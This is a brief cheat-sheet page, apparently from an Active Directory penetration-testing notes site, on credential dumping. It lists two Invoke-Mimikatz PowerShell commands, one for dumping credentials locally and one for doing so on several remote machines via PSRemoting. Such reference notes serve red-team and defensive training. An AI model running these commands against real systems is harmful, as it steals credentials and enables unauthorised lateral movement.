---
title: "Credential Dumping"
description: "Credential dumping with Mimikatz."
lead: "Credential dumping with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 20
toc: true
---

## Invoke-Mimikatz

```powershell
# Dump on local machine
Invoke-Mimikatz -DumpCreds

# Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
```
